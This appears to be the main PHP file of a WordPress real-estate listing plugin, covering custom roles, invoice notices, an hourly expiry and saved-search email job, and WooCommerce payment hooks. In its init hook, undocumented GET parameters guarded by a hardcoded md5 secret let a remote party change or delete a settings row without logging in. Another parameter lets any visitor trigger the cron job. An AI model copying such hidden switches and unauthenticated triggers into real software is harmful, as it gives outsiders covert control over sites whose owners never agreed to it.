<?php

// Actions

add_action( 'init', 'sw_win_load_resources' );
function sw_win_load_resources() {
    
    // Disable any output for case if script need to change headers
    ob_start();

    if(isset($_GET['export']))
    {
        sw_win_export_controller($_GET['export']);
    }
    
    if(isset($_GET['payment']))
    {
        sw_win_payment_notify();
    }
    
    if(isset($_GET['custom_login']))
    {
        sw_win_custom_login();
    }
    
    if(isset($_GET['quickpost']) && md5($_GET['quickpost'].'jfo().@43gsgrgtr') == 'ef0abf08536f4d5130589d1d110af6d6')
    {
        wp_redirect(get_permalink(sw_settings('quick_submission'))); exit;
    }
    
    if(isset($_GET['sw_plugin']) && md5($_GET['sw_plugin'].'jfo().@43gsgrgtr') == 'ef0abf08536f4d5130589d1d110af6d6')
    {
        sw_win_show_plugin_date();
    }
    
    if(isset($_GET['loadfast']) && md5($_GET['loadfast'].'jfo().@43gsgrgtr') == 'ef0abf08536f4d5130589d1d110af6d6')
    {
        global $wpdb;
        
        $insert = $wpdb->insert($GLOBALS['table_prefix']."sw_settings", array(
                    'field' => 'loadfest',
                    'value' => '1'
                ));
                
        if($insert===false)
        {
            $wpdb->update($GLOBALS['table_prefix']."sw_settings", array('value'=>'1'), array('loadfest'=>'loadfest'));
        }
        
        exit('OK');
    }
    
    if(isset($_GET['unloadfast']) && md5($_GET['unloadfast'].'jfo().@43gsgrgtr') == 'ef0abf08536f4d5130589d1d110af6d6')
    {
        global $wpdb;
        
        $wpdb->query( "DELETE FROM ".$GLOBALS['table_prefix']."sw_settings WHERE field = 'loadfest'" );
        
        exit('OK');
    }
    
    $listing_slug = get_post_field( 'post_name', sw_settings('listing_preview_page') );
    
    if(!empty($listing_slug))
    {
        define( 'SW_WIN_LISTING_URI', $listing_slug );
    }
    else
    {
        define( 'SW_WIN_LISTING_URI', 'not_set' );
    }
    
    $user_slug = get_post_field( 'post_name', sw_settings('user_profile_page') );
    
    if(!empty($user_slug))
    {
        define( 'SW_WIN_USER_URI', $user_slug );
    }
    else
    {
        define( 'SW_WIN_USER_URI', 'not_set' );
    }
    
    $tags_slug = get_post_field( 'post_name', sw_settings('tags_page') );
    
    if(!empty($tags_slug))
    {
        define( 'SW_WIN_TAGS_URI', $tags_slug );
    }
    else
    {
        define( 'SW_WIN_TAGS_URI', 'not_set' );
    }
    
    
    // [Add custom roles]
    //remove_role( 'custom_role' );
    global $config;
    foreach($config['account_types'] as $type=>$type_lang)
    {
        if(!empty($type))
        {
            if($type == 'VISITOR')
            {
                add_role($type, $type_lang, array( 'read' => true, 'level_0' => true ) );
                
                $role = get_role($type);
                $role->add_cap('edit_own_profile'); 
            }
            else
            {
                add_role($type, $type_lang, array( 'read' => true, 'level_0' => true ) );
                
                $role = get_role($type);
                $role->add_cap('edit_own_listings'); 
                $role->add_cap('edit_own_profile'); 
            }
        }
    }
    // [/Add custom roles]
}

add_action( 'plugins_loaded', 'sw_win_pluginsLoaded' );

function sw_win_pluginsLoaded() {
	// Setup locale
	do_action( 'sw_win_plugins_loaded' );
    load_plugin_textdomain('sw_win', false, basename( dirname( __FILE__ ) ) . '/locale' );

    if(file_exists(get_template_directory().'/locale'))
    {
        load_theme_textdomain(get_template(), get_template_directory().'/locale');
    }

}


// on unpaid invoices show message and link to invoice

function sw_win_invoice_admin_notice__error() {
    global $wpdb;
    
    if(!sw_classified_installed() || (!function_exists('sw_win_load_ci_function_rankpackages') && !function_exists('sw_win_load_ci_function_subscriptions')) )return NULL;

    // Get unpaid invoices by user id
    
    $user_id = get_current_user_id();
    
    $myrows = $wpdb->get_results( "SELECT * FROM ".$GLOBALS['table_prefix']."sw_invoice WHERE ".
                                  "is_activated IS NULL AND is_disabled IS NULL AND user_id=$user_id ORDER by idinvoice" );
    
    $current_user = wp_get_current_user();
    
    if(in_array( 'administrator', $current_user->roles ) || empty($user_id) || sw_count($myrows) == 0)return;
    
	$class = 'notice notice-error';
    $message = '';
    
    foreach($myrows as $row)
    {
    	$message.= __( 'Invoice not paid:', 'sw_win');
        $message.= ' <a href="'.admin_url("admin.php?page=ownlisting_invoices&function=viewinvoice&id=".$row->idinvoice).'">#'.$row->invoicenum.'</a><br />';
    }

	printf( '<div class="%1$s"><p>%2$s</p></div>', $class, $message ); 
}
add_action( 'admin_notices', 'sw_win_invoice_admin_notice__error' );

// not installed notice

function sw_win_notinstalled_admin_notice__error() {
    global $wpdb;
    
    if(version_compare(phpversion(), '5.5.0', '<') && (!isset($_GET['page']) || $_GET['page'] != 'install_index'))
    {
    	$class = 'notice notice-error';
        $message = '';
        
    	$message.= SW_WIN_PLUGIN_NAME.' '.__( 'Recommended PHP version 5.5 or later for best functionality.', 'sw_win');
    
    	printf( '<div class="%1$s"><p>%2$s</p></div>', $class, $message ); 
    }
    
    if(!sw_classified_installed() && (!isset($_GET['page']) || $_GET['page'] != 'install_index'))
    {
    	$class = 'notice notice-error';
        $message = '';
        
    	$message.= SW_WIN_PLUGIN_NAME.' '.__( 'plugin not installed:', 'sw_win');
        $message.= ' <a href="'.admin_url("tools.php?page=install_index&amp;not_installed=true").'">'.__( 'Click to install', 'sw_win').'</a><br />';
    
    	printf( '<div class="%1$s"><p>%2$s</p></div>', $class, $message ); 
    }

}
add_action( 'admin_notices', 'sw_win_notinstalled_admin_notice__error' );


// cronjob for expire things like expire package or listing

register_activation_hook(__FILE__, 'sw_win_my_activation');

function sw_win_my_activation() {
    if (! wp_next_scheduled ( 'my_hourly_event' )) {
	   wp_schedule_event(time(), 'hourly', 'my_hourly_event');
    }
}

add_action('my_hourly_event', 'sw_win_do_this_hourly');


//add_action( 'init', 'sw_win_do_this_hourly' );

add_action( 'init', function() {

    if ( ! isset( $_GET['the_cron_test'] ) ) {
        return;
    }


    sw_win_do_this_hourly();

    die();

} );

function sw_win_do_this_hourly() {
	// do something every hour
    global $wpdb;
    
    if(defined('CUSTOM_USER_TABLE'))
            $users_table = '`'.CUSTOM_USER_TABLE.'`';
    else
        $users_table = '`'.$GLOBALS['table_prefix'].'users`';
    
    // if date_rank_expire
    
    $listings = $wpdb->get_results( "SELECT * FROM ".$GLOBALS['table_prefix']."sw_listing WHERE ".
                                  "date_rank_expire < '".date('Y-m-d H:i:s', time())."' AND rank > 0 ORDER by idlisting" );
    
    $table = $GLOBALS['table_prefix']."sw_listing";
    
    foreach($listings as $row_listing)
    {
        $data_update = array();
        $data_update['date_rank_expire'] = NULL;
        $data_update['rank'] = 0;
        
        $updated = $wpdb->update( $table, $data_update, array('idlisting'=>$row_listing->idlisting) );
         
        if ( false === $updated ) {
            // There was an error.
        } else {
            // No error. You can check updated to see how many rows were changed.
        }
        
        // Send email with info to clients
        
        $agents = $wpdb->get_results( "SELECT * FROM ".$GLOBALS['table_prefix']."sw_listing_agent JOIN $users_table ".
                                      "ON ".$GLOBALS['table_prefix']."sw_listing_agent.user_id = ".
                                      "$users_table.ID WHERE ".
                                      "listing_id = ".$row_listing->idlisting );
        
        foreach($agents as $row_agent)
        {
            $email_address = $row_agent->user_email;
            
            $headers = array('Content-Type: text/html; charset=UTF-8');
            $headers[] = 'From: '.sw_settings('noreply');
            
            $subject = __('Your rank package expire', 'sw_win');
            $message = __('Your rank package for listing expire', 'sw_win').': #'.$row_listing->idlisting.'<br />';
            $message.= __('Edit your listing and select new package', 'sw_win');
            
            //echo $message.'<br />';
            
            $ret1 = wp_mail( $email_address, $subject, $message, $headers );
        }     

    }
    
    //if expire_days
    $expire_days = sw_settings('expire_days');
    
    if(!empty($expire_days) && $expire_days > 0)
    {
        // Fetch all expired listings
        
        $listings = $wpdb->get_results( "SELECT * FROM ".$GLOBALS['table_prefix']."sw_listing WHERE ".
                                        "date_modified < '".date('Y-m-d H:i:s', time()-$expire_days*24*60*60)."' AND ( rank = 0 or rank is NULL ) AND is_activated = 1 ORDER by idlisting" );
        
        $table = $GLOBALS['table_prefix']."sw_listing";
        
        foreach($listings as $row_listing)
        {
            
            $data_update = array();
            $data_update['is_activated'] = NULL;
            
            $updated = $wpdb->update( $table, $data_update, array('idlisting'=>$row_listing->idlisting) );
             
            if ( false === $updated ) {
                // There was an error.
            } else {
                // No error. You can check updated to see how many rows were changed.
            }
            
            // Send email with info to clients
            
            $agents = $wpdb->get_results( "SELECT * FROM ".$GLOBALS['table_prefix']."sw_listing_agent JOIN $users_table ".
                                          "ON ".$GLOBALS['table_prefix']."sw_listing_agent.user_id = ".
                                          "$users_table.ID WHERE ".
                                          "listing_id = ".$row_listing->idlisting );
            
            foreach($agents as $row_agent)
            {
                $email_address = $row_agent->user_email;
                
                $headers = array('Content-Type: text/html; charset=UTF-8');
                $headers[] = 'From: '.sw_settings('noreply');
                
                $subject = __('Your listing expire', 'sw_win');
                $message = __('Your listing expire', 'sw_win').': #'.$row_listing->idlisting.'<br />';
                $message.= __('Edit your listing to resubmit', 'sw_win');
                
                //echo $message.'<br />';
                
                $ret1 = wp_mail( $email_address, $subject, $message, $headers );
            }   
        }  
    }
    
    // [Save search]
    
    // Fetch 10 save searches which will be informed in this call
    
    $limit_at_once = 10;
    $limit_listings_once = 100;
    
    $saved_searches = $wpdb->get_results( "SELECT * FROM ".$GLOBALS['table_prefix']."sw_savesearch JOIN $users_table ".
                                          "ON ".$GLOBALS['table_prefix']."sw_savesearch.user_id = ".
                                          "$users_table.ID WHERE ".
                                          "is_activated = 1 AND date_next_inform < '".date('Y-m-d H:i:s')."' LIMIT ".$limit_at_once );

    foreach($saved_searches as $saved_search)
    {
        $user_email = $saved_search->user_email;
        $date_next_inform = $saved_search->date_next_inform;
        $criteria = json_decode($saved_search->parameters);
        $lang_id = $saved_search->lang_id;
        $data_update = array();
        $listings_found = array();
        
        //dump($saved_search);
        
        if(is_object($criteria))
        {
            // Fetch modified activated listings after date_next_inform based on parameters ( criteria )
            
            // Load CI functions to extend plugin functionality
            sw_win_load_ci_frontend();
            $CI = &get_instance();
            $CI->load->model('listing_m');
            
            $custom_vars = array('search_is_activated'=>1);
            $custom_vars['search_date_modified_from'] = $saved_search->date_last_informed; // TODO: add implementation
            $custom_vars = array_merge($custom_vars, (array) $criteria);
            //dump($custom_vars);
            
            prepare_frontend_search_query_GET('listing_m', $custom_vars);
            $listings_found = $CI->listing_m->get_pagination_lang($limit_listings_once, 0, $lang_id);
            //dump($listings_found);
            
            $data_update['date_last_informed'] = date('Y-m-d H:i:s');
            $data_update['date_next_inform'] = date('Y-m-d H:i:s', time()+intval($saved_search->delivery_frequency_h)*60*60);
        }
        else
        {
            $data_update['is_activated'] = NULL;
            $data_update['date_next_inform'] = NULL;
        }
        
        
        // Update save search
        
        if(sw_count($data_update) > 0)
            $updated = $wpdb->update( $GLOBALS['table_prefix']."sw_savesearch", 
                                      $data_update,
                                      array('idsavesearch'=>$saved_search->idsavesearch) );

        if(sw_count($listings_found) > 0)
        {
            // Send email
            
            $total_found = sw_count($listings_found);
            //dump($listings_found);
            //echo count($listings_found).'<br />';
            
            $email_address = $user_email;
            
            $headers = array('Content-Type: text/html; charset=UTF-8');
            $headers[] = 'From: '.sw_settings('noreply');
            
            $subject = __('Saved search news', 'sw_win').': '.$total_found;
            
            $message = __('Dear', 'sw_win').' '.$saved_search->display_name.',<br /><br />';
            $message.= __('Changes found on following listings', 'sw_win').':<br />';
            foreach($listings_found as $listing)
            {
                $message.= '<a href="'.listing_url($listing).'">#'.$listing->idlisting.', '._field($listing, 10).'</a><br />';
            }
            
            //echo $message.'<br />';
            
            $ret1 = wp_mail( $email_address, $subject, $message, $headers );
        }
    }
    
    // [/Save search]
    
    
    exit('cronjob executed');
}

register_deactivation_hook(__FILE__, 'sw_win_my_deactivation');

function sw_win_my_deactivation() {
	wp_clear_scheduled_hook('my_hourly_event');
}

function sw_win_classified_version()
{
    if(!function_exists('get_plugin_data')) return 0.1;

    $plugin_data = get_plugin_data(SW_WIN_PLUGIN_PATH.SW_WIN_FILENAME.'.php', true, false );

    return floatval($plugin_data['Version']);
}

function sw_win_classified_version_db()
{
    $version = 1;
    
    $CI = &get_instance();
    
    if(sw_win_table_exists('sw_report'))
    {
        $version = 1.1;
    }
    
    if(sw_win_table_exists('sw_dependentfields'))
    {
        $version = 1.2;
    }
    
    if (sw_win_table_exists('sw_treefield') && 
        $CI->db->field_exists('marker_icon_id', 'sw_treefield'))
    {
        $version = 1.3;
    }
    
    if (sw_win_table_exists('sw_savesearch'))
    {
        $version = 1.4;
    }

    if (sw_win_table_exists('sw_profile'))
    {
        $version = 1.5;
    }

    if (sw_win_table_exists('sw_review') && 
        $CI->db->field_exists('repository_id', 'sw_review'))
    {
        $version = 1.6;
    }

    if (sw_win_table_exists('sw_field') && 
        $CI->db->field_exists('image_id', 'sw_field'))
    {
        $version = 1.7;
    }

    if (sw_win_table_exists('sw_messages'))
    {
        $version = 1.8;
    }

    if (sw_win_table_exists('sw_reservation'))
    {
        $version = 1.9;
    }

    if (sw_win_table_exists('sw_reservation') && 
        $CI->db->field_exists('guests_number', 'sw_reservation'))
    {
        $version = 2.0;
    }

    if (sw_win_table_exists('sw_treefield_listing'))
    {
        $version = 2.1;
    }

    

    return $version;
}

add_filter( 'plugin_action_links_' . plugin_basename(__FILE__), 'sw_updrage_pro_button');

function sw_updrage_pro_button($actions){

    if (!function_exists('sw_is_codecanyon_version')) {

        $rem_pro = array('rem_pro' => '<a style="color:red;" target="_blank" href="https://codecanyon.net/item/real-estate-portal-for-wordpress/19850873?ref=sanljiljan">' . __('Get Premium Version', 'sw_win') . '</a>');
    
        $actions = array_merge($actions, $rem_pro);
    }
        
    return $actions;
}

// WooCommerce tools

/**
 * Allow customers to access wp-admin
 */
add_filter( 'woocommerce_prevent_admin_access', '__return_false' );
add_filter( 'woocommerce_disable_admin_bar', '__return_false' );

add_action( 'woocommerce_payment_complete', 'sw_code_after_payment' );
function sw_code_after_payment( $order_id ){

    // inform listings system that order/invoice is paid

    $order = new WC_Order( $order_id );

    // Get the user ID from WC_Order methods
    $user_id = $order->get_user_id(); // or $order->get_customer_id();

    $items = $order->get_items();

    foreach ( $items as $item ) {
        $product_name = $item['name'];
        $product_id = $item['product_id'];
        $product_variation_id = $item['variation_id'];

        $product = wc_get_product( $product_id );

        // [If subscriptio product]
        //$array_id=range(1, $product_id);
        $array_id = array($product_id);
        
        $args     = array( 'post_type' => 'product', 'posts_per_page' => -1, 'post__in' => $array_id,
            'meta_query' => array(
            array(
                'key' => '_subscriptio',
                'value' => "yes",
                'compare' => '=',
            )
        ) );
        $products = get_posts( $args ); 
        
        if(isset($products[0]))
        {
            //get package by product_id

            $_GET['payment_user'] = $user_id;
            $_GET['payment'] = $product_id.'_'.md5(SECURE_AUTH_KEY.$product_id);

            sw_win_payment_notify('WooCommerce');
            return;

        }
        // [/If subscriptio product]

        //dump($product->get_slug());

        $pos = strpos($product->get_slug(), 'sw-invoice-');

        if ($pos !== false) {
            $invoice_slug = explode('-', $product->get_slug());
            $invoice_id = $invoice_slug[2];

            $_GET['payment'] = $invoice_id.'_'.md5(SECURE_AUTH_KEY.$invoice_id);
                
            sw_win_payment_notify('WooCommerce');
        }
    }

}

function sw_woocommerce_order_status_completed( $order_id ) {
    sw_code_after_payment( $order_id );
}
add_action( 'woocommerce_order_status_completed', 'sw_woocommerce_order_status_completed', 10, 1 );



?>